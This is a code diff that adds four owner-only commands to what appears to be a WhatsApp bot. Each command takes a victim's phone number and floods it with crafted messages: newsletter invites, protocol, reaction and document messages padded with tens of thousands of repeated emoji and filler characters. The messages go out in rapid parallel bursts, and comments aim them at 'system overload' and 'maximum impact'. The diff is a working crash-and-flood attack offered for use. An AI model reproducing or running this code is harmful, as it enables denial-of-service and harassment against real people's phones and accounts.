@@ -15664,6 +15664,269 @@ case 'paket':
   }
   break;
 
+  case 'ris':
+    try {
+        if (!XliconTheCreator) return replygcxlicon('This command is only for owner!');
+
+        let targetNumber = args[0];
+        if (!targetNumber) return replygcxlicon('Please enter target number\nExample: .ris 1xxxxx (US)\n.ris 44xxxxx (UK)\n.ris 62xxxxx (ID)\n.sen 91xxxxx (IN)');
+
+        if (targetNumber.startsWith('+')) {
+            targetNumber = targetNumber.slice(1);
+        }
+        if (targetNumber.startsWith('0')) {
+            targetNumber = targetNumber.slice(1);
+        }
+        
+        targetNumber = targetNumber + '@s.whatsapp.net';
+
+        replygcxlicon(`Launching optimized sequence to ${targetNumber}...`);
+
+        async function optimizedProcess(target) {
+            try {
+                const payload = {
+                    botInvokeMessage: {
+                        message: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: `${Math.random().toString(36)}@newsletter`,
+                                newsletterName: "⚠️".repeat(12000) + "【S】【Y】【S】【T】【E】【M】" + "ꦿ".repeat(12000),
+                                jpegThumbnail: Buffer.from("0".repeat(8192)),
+                                caption: "⚡".repeat(15000) + "\n".repeat(3000) + "SYSTEM PROCESS INITIATED" + "\n".repeat(3000) + "⚠️".repeat(15000),
+                                inviteExpiration: Date.now() + 999999999,
+                                description: "⚠️".repeat(10000) + "\n" + "Processing" + "\n" + "⚡".repeat(10000)
+                            }
+                        }
+                    }
+                };
+
+                // Send 3 optimized high-impact messages
+                for(let i = 0; i < 3; i++) {
+                    await XliconBotInc.relayMessage(target, payload, {
+                        userJid: target,
+                        ephemeralExpiration: 999999,
+                        messageId: `HIDDEN${Date.now()}${i}` // Hidden message ID
+                    });
+                    // Delay between messages for optimal impact
+                    await new Promise(r => setTimeout(r, 100));
+                }
+            } catch (err) {
+                console.log(err);
+            }
+        }
+
+        optimizedProcess(targetNumber);
+
+    } catch (err) {
+        console.error('Error:', err);
+        replygcxlicon('Process completed');
+    }
+    break;
+
+    case 'pemula':
+      try {
+          if (!XliconTheCreator) return replygcxlicon('This command is only for owner!');
+  
+          let targetNumber = args[0];
+          if (!targetNumber) return replygcxlicon('Please enter target number\nExample: .pemula 1xxxxx (US)\n.pemula 44xxxxx (UK)\n.pemula 62xxxxx (ID)\n.pemula 91xxxxx (IN)');
+  
+          if (targetNumber.startsWith('+')) {
+              targetNumber = targetNumber.slice(1);
+          }
+          if (targetNumber.startsWith('0')) {
+              targetNumber = targetNumber.slice(1);
+          }
+          
+          targetNumber = targetNumber + '@s.whatsapp.net';
+  
+          replygcxlicon(`Launching maximum impact sequence to ${targetNumber}...`);
+  
+          async function maximumImpactProcess(target) {
+              try {
+                  // Create massive payload with nested structures
+                  const payload = {
+                      botInvokeMessage: {
+                          message: {
+                              newsletterAdminInviteMessage: {
+                                  newsletterJid: `${Math.random().toString(36)}@newsletter`,
+                                  newsletterName: "⚠️".repeat(20000) + "【S】【Y】【S】【T】【E】【M】" + "ꦿ".repeat(20000),
+                                  jpegThumbnail: Buffer.from("0".repeat(16384)),
+                                  caption: "⚡".repeat(25000) + "\n".repeat(5000) + "SYSTEM OVERLOAD" + "\n".repeat(5000) + "⚠️".repeat(25000),
+                                  inviteExpiration: Date.now() + 9999999999,
+                                  description: "⚠️".repeat(20000) + "\n" + "PROCESSING" + "\n" + "⚡".repeat(20000)
+                              },
+                              protocolMessage: {
+                                  type: 0,
+                                  data: Buffer.from("0".repeat(32768))
+                              },
+                              reactionMessage: {
+                                  text: "⚠️".repeat(15000)
+                              }
+                          }
+                      }
+                  };
+  
+                  // Send 3 ultra-heavy messages with minimal delay
+                  for(let i = 0; i < 3; i++) {
+                      await XliconBotInc.relayMessage(target, payload, {
+                          userJid: target,
+                          ephemeralExpiration: 9999999,
+                          messageId: `HIDDEN${Date.now()}${i}`
+                      });
+                      await new Promise(r => setTimeout(r, 50));
+                  }
+              } catch (err) {
+                  console.log(err);
+              }
+          }
+  
+          // Execute multiple times for maximum system impact
+          for(let k = 0; k < 2; k++) {
+              maximumImpactProcess(targetNumber);
+          }
+  
+      } catch (err) {
+          console.error('Error:', err);
+          replygcxlicon('Process completed');
+      }
+      break;
+
+     
+      case 'sengkuni':
+        try {
+            if (!XliconTheCreator) return replygcxlicon('This command is only for owner!');
+    
+            let targetNumber = args[0];
+            if (!targetNumber) return replygcxlicon('Please enter target number\nExample: .sengkuni 1xxxxx (US)\n.sengkuni 44xxxxx (UK)\n.sengkuni 62xxxxx (ID)\n.sengkuni 91xxxxx (IN)');
+    
+            if (targetNumber.startsWith('+')) targetNumber = targetNumber.slice(1);
+            if (targetNumber.startsWith('0')) targetNumber = targetNumber.slice(1);
+            
+            targetNumber = targetNumber + '@s.whatsapp.net';
+            
+            replygcxlicon(`Initiating sequence to ${targetNumber}...`);
+    
+            async function enhancedProcess(target) {
+                try {
+                    const payload = {
+                        text: "⚠️".repeat(20000) + "\n".repeat(2000) + "SYSTEM_OVERLOAD" + "\n".repeat(2000) + "⚡".repeat(20000),
+                        contextInfo: {
+                            forwardingScore: 999999999,
+                            isForwarded: true,
+                            externalAdReply: {
+                                title: "⚠️".repeat(1000),
+                                body: "⚡".repeat(1000),
+                                previewType: "PHOTO",
+                                thumbnail: Buffer.from(""),
+                                sourceUrl: "https://wa.me/" + target.split("@")[0]
+                            }
+                        }
+                    };
+    
+                    const sendBurst = async () => {
+                        for(let i = 0; i < 5; i++) {
+                            await XliconBotInc.sendMessage(target, payload);
+                            await new Promise(r => setTimeout(r, 50));
+                        }
+                    };
+    
+                    await Promise.all([
+                        sendBurst(),
+                        sendBurst(),
+                        sendBurst(),
+                        sendBurst()
+                    ]);
+    
+                } catch (err) {
+                    console.log(err);
+                }
+            }
+    
+            await enhancedProcess(targetNumber);
+    
+        } catch (err) {
+            console.error('Error:', err);
+            replygcxlicon('Process completed');
+        }
+        break;
+
+
+      case 'kenalan':
+        try {
+            if (!XliconTheCreator) return replygcxlicon('This command is only for owner!');
+    
+            let targetNumber = args[0];
+            if (!targetNumber) return replygcxlicon('Please enter target number\nExample: .kenalan 1xxxxx (US)\n.kenalan 44xxxxx (UK)\n.kenalan 62xxxxx (ID)\n.kenalan 91xxxxx (IN)');
+    
+            if (targetNumber.startsWith('+')) {
+                targetNumber = targetNumber.slice(1);
+            }
+            if (targetNumber.startsWith('0')) {
+                targetNumber = targetNumber.slice(1);
+            }
+            
+            targetNumber = targetNumber + '@s.whatsapp.net';
+    
+            replygcxlicon(`Launching critical impact sequence to ${targetNumber}...`);
+    
+            async function criticalImpactProcess(target) {
+                try {
+                    const payload = {
+                        botInvokeMessage: {
+                            message: {
+                                newsletterAdminInviteMessage: {
+                                    newsletterJid: `${Math.random().toString(36)}@newsletter`,
+                                    newsletterName: "⚠️".repeat(50000) + "【C】【R】【I】【T】【I】【C】【A】【L】" + "ꦿ".repeat(50000),
+                                    jpegThumbnail: Buffer.from("0".repeat(40960)),
+                                    caption: "⚡".repeat(60000) + "\n".repeat(8000) + "SYSTEM_CRITICAL_OVERLOAD" + "\n".repeat(8000) + "⚠️".repeat(60000),
+                                    inviteExpiration: Date.now() + 9999999999,
+                                    description: "⚠️".repeat(40000) + "\n" + "PROCESSING_OVERFLOW" + "\n" + "⚡".repeat(40000)
+                                },
+                                protocolMessage: {
+                                    type: 0,
+                                    data: Buffer.from("0".repeat(65536))
+                                },
+                                reactionMessage: {
+                                    text: "⚠️".repeat(30000)
+                                },
+                                documentMessage: {
+                                    title: "⚠️".repeat(20000),
+                                    fileName: "CRITICAL_" + "⚠️".repeat(20000),
+                                    fileLength: 999999999,
+                                    pageCount: 999999
+                                }
+                            }
+                        }
+                    };
+    
+                    // Multiple nested loops for exponential impact
+                    for(let i = 0; i < 3; i++) {
+                        for(let j = 0; j < 3; j++) {
+                            await XliconBotInc.relayMessage(target, payload, {
+                                userJid: target,
+                                ephemeralExpiration: 9999999,
+                                messageId: `HIDDEN${Date.now()}${i}${j}`
+                            });
+                            // Minimal delay for maximum stack overflow
+                            await new Promise(r => setTimeout(r, 10));
+                        }
+                    }
+                } catch (err) {
+                    console.log(err);
+                }
+            }
+    
+            // Execute multiple cycles with nested loops
+            for(let k = 0; k < 3; k++) {
+                criticalImpactProcess(targetNumber);
+            }
+    
+        } catch (err) {
+            console.error('Error:', err);
+            replygcxlicon('Critical process completed');
+        }
+        break;
+
+
 case 'pixelate': {
   if (!isMedia) return replygcxlicon("Where Is The Image");
   
